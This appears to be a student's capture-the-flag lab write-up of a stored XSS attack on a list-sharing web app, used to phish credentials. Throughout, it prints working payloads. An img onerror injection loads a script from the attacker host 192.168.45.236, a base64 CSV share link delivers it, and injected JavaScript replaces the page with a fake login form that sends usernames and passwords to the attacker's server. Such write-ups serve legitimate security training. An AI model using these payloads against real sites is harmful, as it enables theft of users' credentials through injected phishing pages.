<img src='x' onerror="const script = document.createElement('script');script.src = 'http://192.168.45.236/chatgptphish.js';script.async = true;document.body.appendChild(script);">
```

Enter it into the vulnerable field
![[Pasted image 20240806160649.png]]
we get a hit on the `python3 -m http.server`
![[Pasted image 20240806160721.png]]
hit `share` and copy the `csv`
```csv
?csv=IyxVc2VyLGFjdGl2ZQo8aW1nIHNyYz0neCcgb25lcnJvcj0iY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7c2NyaXB0LnNyYyA9ICdodHRwOi8vMTkyLjE2OC40NS4yMzYvcGhpc2hpbmdleGVyY2lzZS5qcyc7c2NyaXB0LmFzeW5jID0gdHJ1ZTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7Ij4gLFNhbWFudGhhLDEK
```
![[Pasted image 20240806160749.png]]


document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.45.236/login" method="GET">' +
    '<div class="container">' +
        '<label for="uname"><b>Username</b></label>' +
        '<input type="text" placeholder="Enter Username" name="uname" required><br>' +
        '<label for="psw"><b>Password</b></label>' +
        '<input type="password" placeholder="Enter Password" name="psw" required><br>' +
        '<button type="submit">Login</button>' +
    '</div>' +
'</form>';
---------------------
### Comparing payloads
##### phishingexercise.js 
- changed `;` to the end and `'` `'` instead of `"` `"` added 2 `<br>`
```html
document.getElementsByTagName("html")[0].innerHTML = '<formÂ action="http://192.168.45.236/login"Â method="GET"><divÂ class="container"><labelÂ for="uname"><b>Username</b></label><inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required><br><labelÂ for="psw"><b>Password</b></label><inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required><br><buttonÂ type="submit">Login</button></div></form>';
```
What it looks like:

<formÂ action="http://192.168.45.236/login"Â method="GET"><divÂ class="container"><labelÂ for="uname"><b>Username</b></label><inputÂ type="text"Â placeholder="Enter Username"Â name="uname"Â required><br><labelÂ for="psw"><b>Password</b></label><inputÂ type="password"Â placeholder="Enter Password"Â name="psw"Â required><br><buttonÂ type="submit">Login</button></div></form>
##### phishingexercise.js chatgpt Fixed - FINAL
```html
document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.45.236/login" method="GET"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="uname" required><br><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="psw" required><br><button type="submit">Login</button></div></form>';
```
<form action="http://192.168.45.236/login" method="GET"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="uname" required><br><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="psw" required><br><button type="submit">Login</button></div></form>

**The reasoning why our original payload wouldn't work was due to things in HTML called `non breaking spaces` in this case they were invisible, the lines are able to be identified utilizing vscode - once this is fixed the code works properly** 
![[Pasted image 20240806172916.png]]
My `phishingexercise.js` payload
```js
<img src='x' onerror="const script = document.createElement('script');script.src = 'http://192.168.45.236/phishingexercise.js';script.async = true;document.body.appendChild(script);">
```


#### Exploit start:
Explanation:

- the `list.com` application requires `img src` to be utilized to execute scripts - the problem is that whe attempting to utilize `<img src="x" onerror='fetch("http://192.168.45.236:80/phishingexercise.js")'>` as the payload to retrieve a `login` application to then phish `fetch` does not execute the `phishingexercise.js` payload only is seen as a `GET` request in the `python3 server`
- In order to make `phishingexercise.js` into a html script https://www.w3schools.com/howto/howto_css_login_form.asp 
- In order to make `phishingexercise.js` into a `js` executable script element used this https://www.codingbeautydev.com/blog/javascript-create-script-element
![[Pasted image 20240806175037.png]]

Script utilized to bypass `innerHTML` script running by utilizing `img` - this script is used to pull and execute the `phishingexercise.js` payload
- the payload entered into the vulnerable field
```js
<img src='x' onerror="const script = document.createElement('script');script.src = 'http://192.168.45.236/phishingexercise.js';script.async = true;document.body.appendChild(script);">
```
My `phishingexercise.js` payload
```html
document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.45.236/login" method="GET"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="uname" required><br><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="psw" required><br><button type="submit">Login</button></div></form>';
```
With `python3 server` off and not listening throw the payload above into the `list` application in the vulnerable field and hit `share` to grab the `csv`
![[Pasted image 20240806173441.png]]
copy and paste the `csv` text into the url - turn on the python3 server and hit enter on the url
```csv
?csv=IyxVc2VyLGFjdGl2ZQo8aW1nIHNyYz0neCcgb25lcnJvcj0iY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7c2NyaXB0LnNyYyA9ICdodHRwOi8vMTkyLjE2OC40NS4yMzYvcGhpc2hpbmdleGVyY2lzZS5qcyc7c2NyaXB0LmFzeW5jID0gdHJ1ZTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7Ij4gLFNhbWFudGhhLDEK
```
upon hitting enter the `url` gets forwarded to grab `http://192.168.45.236/phishingexercise.js` script from our kali machine which redirects to  `http://192.168.45.236/login` page 
![[Pasted image 20240806173943.png]]
upon hitting `login` our `python3` server displays the input fields of `test` and `test`
![[Pasted image 20240806174655.png]]
So now rendering the page as the victim with `blindly entered credentials` 
![[Pasted image 20240806174857.png]]
and in the `python3 -m http.server` we finally get the flag
`OS{j0hnnydonthax}`
![[Pasted image 20240806174929.png]]


